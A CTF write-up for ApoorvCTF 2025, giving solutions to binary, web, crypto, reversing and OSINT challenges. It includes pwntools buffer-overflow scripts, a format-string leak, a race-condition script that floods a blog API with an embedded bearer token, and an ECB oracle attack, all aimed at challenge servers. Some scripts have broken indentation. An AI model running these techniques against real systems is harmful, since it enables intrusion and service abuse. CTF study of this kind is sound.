---
title: "ApoorvCTF 2025"
description: Writeups of ApoorvCTF 2025
type: "list"
draft: false
date: 2025-03-03
Tags:
- CTF
- ApoorvCTF
- 2025

---


![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image.png)

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%201.png)

# Binary Exploitation

## Challenge: Kogarashi Café - The First Visit

### Flag: apoorvctf{c0ffee_buff3r_sp1ll}

Solution:

```python
from pwn import *
p = remote("chals1.apoorvctf.xyz", 3001)  # Connect to challenge server
brew_coffee_addr = 0x0804856b  # Address of brew_coffee()
ret_gadget = 0x080483d0  # Optional "ret" instruction (stack alignment)
payload = b"A" * 40  # Fill buffer
payload += p32(ret_gadget)  # Optional ret gadget (for alignment)
payload += p32(brew_coffee_addr)  # Overwrite return address
p.sendline(payload)  # Send exploit payload
print(p.recvall().decode(errors="ignore"))  # Receive flag output
p.close()
```

## Challenge: Kogarashi Café - The Secret Blend

### Flag: apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}

Solution:

```bash
┌──(myenv)─(glutton㉿glutton)-[~/CTF/apoorvCTF/files]
└─$ nc chals1.apoorvctf.xyz 3003 
Welcome to Kogarashi Café.
Barista: 'What will you have?'
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p          
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x5b8481 0xfbad2288 0xffa47b7f 0x5b84b0 (nil) 0x746376726f6f7061
 0x334d5f3368547b66 0x736b34334c5f756e 0x68545f6572304d5f 0x68535f74495f6e61 
 0x7d646c7530 0x404050 0x7f29c379f5e0 0x7025207025207025 0x2520702520702520 
 0x2070252070252070
```

now `0x746376726f6f7061 0x334d5f3368547b66 0x736b34334c5f756e 0x68545f6572304d5f 0x68535f74495f6e61 0x7d646c7530` reversing these and unhexing in cyberchef we get flag

## Challenge: Kogarashi Café - The Forbidden Recipe

### Flag: apoorvctf{d3caf_is_bad_f0r_0verfl0ws}

Solution:

```python
from pwn import *

# Remote connection to CTF challenge
p = remote("chals1.apoorvctf.xyz", 3002)

# Construct payload
payload = b"A" * 32          # Fill buffer
payload += p32(0xdecafbad)   # Overwrite local_14
payload += p32(0x00c0ff33)   # Overwrite local_10

# Send payload
p.sendline(payload)

# Interact with the shell/flag output
p.interactive()
```

# Web Exploitation

## Challenge: Blog-1

### Flag: apoorvctf{s1gm@_s1gm@_b0y}

This challenge only allows users to create one blog at a time so we have to make a race condition to let the server approve the request we send. For this challenge, we had to create 5 blogs after which gives us a reward.

```python
import asyncio
import aiohttp

URL = "http://chals1.apoorvctf.xyz:5001/api/v1/blog/addBlog"

HEADERS = {
    "Host": "chals1.apoorvctf.xyz:5001",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2N2MzZGQwMDZlNzk5OWVlMDJjM2NhYjciLCJ1c2VybmFtZSI6InNleHkiLCJpYXQiOjE3NDA4ODkzNDksImV4cCI6MTc0MDg5Mjk0OX0.gJ9PwASH5SmXIa1rYrdQCxtYqGxyZikQcFS95YsCAEY",
    "Origin": "http://chals1.apoorvctf.xyz:5001",
    "Connection": "keep-alive",
    "Referer": "http://chals1.apoorvctf.xyz:5001/",
    "Priority": "u=0"
}

PAYLOAD = {
    "title": "Race condition",
    "description": "success",
    "visible": True,
    "date": "2025-03-01T09:47:38.723Z"
}

# Set the number of concurrent requests per wave.
NUM_REQUESTS_PER_WAVE = 500

async def send_request(session, i, start_event):
    # Wait until all tasks are ready to send their request
    await start_event.wait()
    try:
        async with session.post(URL, json=PAYLOAD, headers=HEADERS) as response:
            text = await response.text()
            return i, response.status, text
    except Exception as e:
        return i, None, f"Exception: {str(e)}"

async def run_wave(session, wave_number):
    # Create an event to synchronize the start of all requests in the wave.
    start_event = asyncio.Event()
    tasks = [asyncio.create_task(send_request(session, i, start_event))
             for i in range(NUM_REQUESTS_PER_WAVE)]
    
    # Small delay to ensure all tasks are waiting on the event.
    await asyncio.sleep(0.1)
    # Release all tasks to send their request concurrently.
    start_event.set()
    
    results = await asyncio.gather(*tasks)
    successes = []
    for i, status, text in results:
        # If the response text does not include the rejection message, consider it a success.
        if "Only one blog per day" not in text:
            successes.append((i, status, text))
    
    print(f"Wave {wave_number}: {len(successes)} successes out of {NUM_REQUESTS_PER_WAVE} requests")
    return successes

async def main():
    success_entries = []
    wave = 1
    async with aiohttp.ClientSession() as session:
        while len(success_entries) < 5:
            successes = await run_wave(session, wave)
            success_entries.extend(successes)
            print(f"Total successes so far: {len(success_entries)}")
            wave += 1
            # Optional delay between waves to avoid flooding the server
            await asyncio.sleep(0.5)
    
    print(f"\n--- Achieved {len(success_entries)} successful blog posts ---")
    for entry in success_entries:
        print(f"Request {entry[0]}: Status {entry[1]} - {entry[2]}")

if __name__ == "__main__":
    asyncio.run(main())
```

The reward provided a YouTube link: [https://youtu.be/WePNs-G7puA?si=DOUFW9vAgUKdClxX](https://youtu.be/WePNs-G7puA?si=DOUFW9vAgUKdClxX)

When looking at burp request we had endpoint `/api/v1/addBlog` initially, after creating 5 blogs, we got another another endpoint, `/api/v2/gift` . This was vague but hard to notice so we were stuck for a while. Then we got the flag after making the endpoint `/api/v1/gift` and sent the request through burp-suite. 

## Challenge: Seo Ceo

### Flag: **apoorvctf{s30_1snT_0pt1onaL}**

In this challenge, we found 2 files robots.txt and sitemap.xml. we had a fake flag in robots.txt.

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%202.png)

In sitemap.xml, we found a mysterious endpoint

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%203.png)

Visisting it we were asked a question,”Do you want the “flag” yes/no?”.

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%204.png)

We were stuck on how to answer this question, until we thought of it as a parameter in url, flag=yes.

and it worked.

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%205.png)

# **Miscellaneous**

## Challenge: Ghosted on the 14th

### Flag:  apoorctf{1m_g01ng_1n5an3}

This challenge had a pcap file which contained single http traffic.

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%206.png)

This had a destination in ip `172.200.32.81:8080` normally we can’t access it, but with waybackmachine we could. There was some base64 string in source.

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%207.png)

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%208.png)

# Cryptography

## Challenge: Kowareta Cipher

### Flag: apoorvctf{3cb_345y_crypt0_br34k}

Solution:

```python
from pwn import remote
def get_ciphertext(io, hex_input):
io.sendlineafter("Enter your input:", hex_input)
response = io.recvline().decode(errors='ignore').strip()
if "Ciphertext:" in response:
    return response.split("Ciphertext: ")[1]
else:
    print("[-] No ciphertext received. Possible connection issue.")
    return ""

def detect_block_size(io):
base_input = "41"  # Minimal valid input ("A" in hex)
base_len = len(get_ciphertext(io, base_input))
for i in range(2, 33):
    new_len = len(get_ciphertext(io, "41" * i))
    if new_len > base_len:
        return new_len - base_len

return None

def confirm_ecb(io, block_size):
test_input = "41" * block_size * 2  # Two identical blocks
ciphertext = get_ciphertext(io, test_input)
if len(ciphertext) >= block_size * 4:
return ciphertext[:block_size * 2] == ciphertext[block_size * 2:block_size * 4]
return False
def recover_flag(io, block_size):
flag = b""
for i in range(block_size * 2):
    padding = "41" * (block_size - 1 - (i % block_size))
    known_block = get_ciphertext(io, padding)[:block_size * 2]

    found = False
    for b in range(256):
        guess = padding + flag.hex() + format(b, '02x')
        attempt_cipher = get_ciphertext(io, guess)

        if len(attempt_cipher) >= block_size * 2 and attempt_cipher[:block_size * 2] == known_block:
            flag += bytes([b])
            print(f"[+] Found: {flag.decode(errors='ignore')}")
            found = True
            break

    if not found:
        print("[-] Failed to match a byte. Exiting.")
        break

return flag.decode(errors='ignore')

def main():
try:
io = remote("chals1.apoorvctf.xyz", 4001)
print("[+] Connected to challenge server")
    block_size = detect_block_size(io)
    if block_size:
        print(f"[+] Block size detected: {block_size}")
    else:
        print("[-] Failed to detect block size")
        return

    if confirm_ecb(io, block_size):
        print("[+] ECB mode confirmed!")
    else:
        print("[-] ECB mode NOT detected. Exiting.")
        return

    flag = recover_flag(io, block_size)
    print(f"[+] Recovered Flag: {flag}")

except Exception as e:
    print(f"[!] Error: {str(e)}")
finally:
    io.close()
    print("[*] Connection closed.")

if name == "main":
main()
```

## Challenge: Split Lies

### Flag: apoorvctf{L4y3R3d_T2u7H}

For this challenge, we were given 2 images which we had to join with pixels.

After adding we had a flag which could not be read. So we asked deepseek to make a script for this.

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%209.png)

Solution:

```python
from PIL import Image
import numpy as np

def load_image(image_path):
    """Load an image from the given path and convert it to a numpy array."""
    with Image.open(image_path) as img:
        return np.array(img)

def add_pixel_values(img1, img2):
    """Add pixel values of two images."""
    # Clip the values to ensure they stay within the valid range (0-255)
    return np.clip(img1 + img2, 0, 255)

def save_image(pixel_array, output_path):
    """Save a numpy array as an image."""
    img = Image.fromarray(pixel_array.astype('uint8'))
    img.save(output_path)

def main(image1_path, image2_path, output_path):
    # Load the images
    img1 = load_image(image1_path)
    img2 = load_image(image2_path)

    # Ensure both images have the same dimensions
    if img1.shape != img2.shape:
        raise ValueError("Both images must have the same dimensions.")

    # Add pixel values
    combined_pixels = add_pixel_values(img1, img2)

    # Save the resulting image
    save_image(combined_pixels, output_path)
    print(f"Resulting image saved to {output_path}")

if __name__ == "__main__":
    # Replace with the paths to your images
    image1_path = "part1.png"
    image2_path = "part2.png"
    output_path = "output_image.png"

    main(image1_path, image2_path, output_path)
```

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%2010.png)

# Reverse Engineering

## Challenge: Holy Rice

### Flag: apoorvctf{w41t#_th15_1s_1ll3g4l!}

Solution:

```python
import string

# Given transformed string
s2 = "6!!sbn*ass%84z@84c(8o_^4#_#8b0)5m_&j}y$vvw!h"

# Step 1: Reverse the string (undo sub_1418)
reversed_s = s2[::-1]

# Step 2: Remove every extra inserted character from "!@#$%^&*()" (undo sub_12CB)
extra_chars = "!@#$%^&*()"
filtered_s = "".join(c for i, c in enumerate(reversed_s) if (i % 4) != 1)  # They were inserted every 3rd original char

# Step 3: Reverse the character shift (undo sub_1199)
charset = "0123456789abcdefghijklmnopqrstuvwxyz_{}"
shifted_charset = charset[7:] + charset[:7]  # Create the shifted mapping
reverse_map = {shifted_charset[i]: charset[i] for i in range(len(charset))}  # Reverse mapping

original_s = "".join(reverse_map[c] if c in reverse_map else c for c in filtered_s)

print("Recovered password:", original_s)
```

# OSINT

## Challenge: I Love Japan: Flag Hunt

### Flag: apoorvctf{Fr13ndsh1p_G04ls}

From previous challenge’s image we get to know the user name of github. Here we see a esolang written in Japanese. This code gave fake flag is user answered yes. But the commit description said printed flag helps nad gave us what seems like base64.

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%2011.png)

After fiddling around for a long time, I opened a ticket and got to know that the whole fake flag was a key. so we tried various cipher with no avail. Then we asked chat gpt which replied it might be AES, DES and more so we tired AES after converting the base64 string and the key to hex. Using KEY and IV as same in AES we got the flag while jumping around the modes in cyberchef.

 

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%2012.png)

![image.png](Apoorv%20CTF-2025%20Write-ups%201abb62881f0980f29825f74add17d76b/image%2013.png)